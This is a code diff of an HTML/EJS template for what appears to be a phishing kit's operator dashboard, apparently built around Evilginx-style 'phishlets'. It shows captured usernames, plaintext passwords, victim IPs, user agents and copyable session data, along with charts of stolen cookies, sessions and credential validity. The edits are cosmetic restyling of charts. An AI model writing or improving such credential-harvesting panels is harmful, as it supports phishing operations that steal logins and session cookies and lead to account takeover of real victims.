@@ -223,20 +223,20 @@
             </tr>
             <% data.sort((a, b) => b.id - a.id).map(item => { %> <!-- Sort sessions by descending ID -->
 
-                <tr>
-                    <td style="word-break: break-all; font-size: 90%; padding: 20px 10px;"><%= item.id %></td>
-                    <td><%= item.username %></td>
-                    <td><%= item.password %></td>
-                    <td><%= item.remote_addr %></td>
-                    <td><%= item.useragent %></td>
-                    <td><%= JSON.stringify(new Date(item.create_time).toLocaleString()) %></td>
-                    <td>
-                        <button class="btn btn-success btn-sm" onclick="copyDetails(this)">
-                            Copy Details
-                            <span style="display: none"><%= JSON.stringify(item.custom) %></span>
-                        </button>
-                    </td>
-                </tr>
+            <tr>
+                <td style="word-break: break-all; font-size: 90%; padding: 20px 10px;"><%= item.id %></td>
+                <td><%= item.username %></td>
+                <td><%= item.password %></td>
+                <td><%= item.remote_addr %></td>
+                <td><%= item.useragent %></td>
+                <td><%= JSON.stringify(new Date(item.create_time).toLocaleString()) %></td>
+                <td>
+                    <button class="btn btn-success btn-sm" onclick="copyDetails(this)">
+                        Copy Details
+                        <span style="display: none"><%= JSON.stringify(item.custom) %></span>
+                    </button>
+                </td>
+            </tr>
             <% }) %>
         </table>
     </div>
@@ -250,7 +250,7 @@
             <div class="col-md-6">
                 <div class="card">
                     <div class="card-header">
-                        <h5>Cookie vs Session state </h5>
+                        <h5>Cookie vs Session State </h5>
                     </div>
                     <div class="card-body">
                         <canvas id="myChart" style="max-height: 300px"></canvas>
@@ -271,7 +271,7 @@
             <div class="col-md-12">
                 <div class="card">
                     <div class="card-header">
-                        <h5>IP Addresses by Country</h5>
+                        <h5>Pishlet Wise State</h5>
                     </div>
                     <div class="card-body">
                         <div id="countryWiseIpCount" style=" width: 100%;
@@ -287,9 +287,9 @@
 
 <!-- JavaScript Section -->
 <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<!-- Resources -->
 <script src="https://cdn.amcharts.com/lib/5/index.js"></script>
-<script src="https://cdn.amcharts.com/lib/5/map.js"></script>
-<script src="https://cdn.amcharts.com/lib/5/geodata/worldLow.js"></script>
+<script src="https://cdn.amcharts.com/lib/5/xy.js"></script>
 <script src="https://cdn.amcharts.com/lib/5/themes/Animated.js"></script>
 <script>
     // Function to open tabs
@@ -359,13 +359,13 @@
     // Pie Chart configuration
     const ctx = document.getElementById('myChart');
     new Chart(ctx, {
-        type: 'pie',
+        type: 'polarArea',
         data: {
             labels: ['Session', 'Cookies'],
             datasets: [{
                 label: 'Total',
                 data: [<%= sessionCount %>, <%= cookieCount %>],
-                backgroundColor: ['green', 'blue'],
+                backgroundColor: ['#442f7d', '#964d9a'],
                 hoverOffset: 4
             }]
         },
@@ -385,13 +385,13 @@
 
     const userPassPieChart = document.getElementById('userPassPieChart');
     new Chart(userPassPieChart, {
-        type: 'pie',
+        type: 'doughnut',
         data: {
             labels: ['Valid UserName', 'Valid Password', 'Both Invalid'],
             datasets: [{
                 label: 'Total',
                 data: [<%= validUserCount %>, <%= validPasswordCount %>, <%= invalidUserPassCount %>],
-                backgroundColor: ['green', 'yellow', 'red'],
+                backgroundColor: ['#4CAF50', '#cfcf12', 'red'],
                 hoverOffset: 4
             }]
         },
@@ -418,107 +418,112 @@
         }
     }
 
-    // Map rendering logic
+
     am5.ready(async function () {
         const countryData = await fetchCountryData();
-
         // Convert country data to Highcharts format
-        const data = Object.keys(countryData).map(country => {
-            const parts = country.split("|");
+        const data = Object.keys(countryData).map(item => {
             return {
-                'id': parts[0],
-                'name': parts[1],
-                'value': countryData[country]
+                'country': item,
+                'value': countryData[item]
             };
         });
-
-        console.log(data);
-
+        // Create root element
+        // https://www.amcharts.com/docs/v5/getting-started/#Root_element
         var root = am5.Root.new("countryWiseIpCount");
-        root.setThemes([am5themes_Animated.new(root)]);
 
-        var chart = root.container.children.push(am5map.MapChart.new(root, {}));
-
-        var polygonSeries = chart.series.push(
-            am5map.MapPolygonSeries.new(root, {
-                geoJSON: am5geodata_worldLow,
-                exclude: ["AQ"]
-            })
-        );
-
-        var bubbleSeries = chart.series.push(
-            am5map.MapPointSeries.new(root, {
-                valueField: "value",
-                calculateAggregates: true,
-                polygonIdField: "id"
-            })
-        );
-
-        var circleTemplate = am5.Template.new({});
-
-        bubbleSeries.bullets.push(function (root, series, dataItem) {
-            var container = am5.Container.new(root, {});
-
-            var circle = container.children.push(
-                am5.Circle.new(root, {
-                    radius: 10,
-                    fillOpacity: 0.7,
-                    fill: am5.color(0xff0000),
-                    cursorOverStyle: "pointer",
-                    tooltipText: `{name}: [bold]{value}[/]`
-                }, circleTemplate)
-            );
-
-            var countryLabel = container.children.push(
-                am5.Label.new(root, {
-                    text: "{name}",
-                    paddingLeft: 5,
-                    populateText: true,
-                    fontWeight: "bold",
-                    fontSize: 13,
-                    centerY: am5.p50
-                })
-            );
-
-            circle.on("radius", function (radius) {
-                countryLabel.set("x", radius);
-            })
-
-            return am5.Bullet.new(root, {
-                sprite: container,
-                dynamic: true
-            });
-        });
-
-        bubbleSeries.bullets.push(function (root, series, dataItem) {
-            return am5.Bullet.new(root, {
-                sprite: am5.Label.new(root, {
-                    text: "{value.formatNumber('#.')}",
-                    fill: am5.color(0xffffff),
-                    populateText: true,
-                    centerX: am5.p50,
-                    centerY: am5.p50,
-                    textAlign: "center"
-                }),
-                dynamic: true
-            });
-        });
-
-// minValue and maxValue must be set for the animations to work
-        bubbleSeries.set("heatRules", [
-            {
-                target: circleTemplate,
-                dataField: "value",
-                min: 10,
-                max: 20,
-                minValue: 0,
-                maxValue: 50,
-                key: "radius"
-            }
+        // Set themes
+        // https://www.amcharts.com/docs/v5/concepts/themes/
+        root.setThemes([
+            am5themes_Animated.new(root)
         ]);
 
-        bubbleSeries.data.setAll(data);
-    });
+        // Create chart
+        // https://www.amcharts.com/docs/v5/charts/xy-chart/
+        var chart = root.container.children.push(am5xy.XYChart.new(root, {
+            panX: true,
+            panY: true,
+            wheelX: "panX",
+            wheelY: "zoomX",
+            pinchZoomX: true,
+            paddingLeft: 0,
+            paddingRight: 1
+        }));
+
+        // Add cursor
+        // https://www.amcharts.com/docs/v5/charts/xy-chart/cursor/
+        var cursor = chart.set("cursor", am5xy.XYCursor.new(root, {}));
+        cursor.lineY.set("visible", false);
+
+
+        // Create axes
+        // https://www.amcharts.com/docs/v5/charts/xy-chart/axes/
+        var xRenderer = am5xy.AxisRendererX.new(root, {
+            minGridDistance: 30,
+            minorGridEnabled: true
+        });
+
+        xRenderer.labels.template.setAll({
+            rotation: -90,
+            centerY: am5.p50,
+            centerX: am5.p100,
+            paddingRight: 15
+        });
+
+        xRenderer.grid.template.setAll({
+            location: 1
+        })
+
+        var xAxis = chart.xAxes.push(am5xy.CategoryAxis.new(root, {
+            maxDeviation: 0.3,
+            categoryField: "country",
+            renderer: xRenderer,
+            tooltip: am5.Tooltip.new(root, {})
+        }));
+
+        var yRenderer = am5xy.AxisRendererY.new(root, {
+            strokeOpacity: 0.1
+        })
+
+        var yAxis = chart.yAxes.push(am5xy.ValueAxis.new(root, {
+            maxDeviation: 0.3,
+            renderer: yRenderer
+        }));
+
+        // Create series
+        // https://www.amcharts.com/docs/v5/charts/xy-chart/series/
+        var series = chart.series.push(am5xy.ColumnSeries.new(root, {
+            name: "Series 1",
+            xAxis: xAxis,
+            yAxis: yAxis,
+            valueYField: "value",
+            sequencedInterpolation: true,
+            categoryXField: "country",
+            tooltip: am5.Tooltip.new(root, {
+                labelText: "{valueY}"
+            })
+        }));
+
+        series.columns.template.setAll({cornerRadiusTL: 5, cornerRadiusTR: 5, strokeOpacity: 0});
+        series.columns.template.adapters.add("fill", function (fill, target) {
+            return chart.get("colors").getIndex(series.columns.indexOf(target));
+        });
+
+        series.columns.template.adapters.add("stroke", function (stroke, target) {
+            return chart.get("colors").getIndex(series.columns.indexOf(target));
+        });
+
+        // Set data
+
+        xAxis.data.setAll(data);
+        series.data.setAll(data);
+
+        // Make stuff animate on load
+        // https://www.amcharts.com/docs/v5/concepts/animations/
+        series.appear(1000);
+        chart.appear(1000, 100);
+
+    }); // end am5.ready()
 </script>
 </body>
 
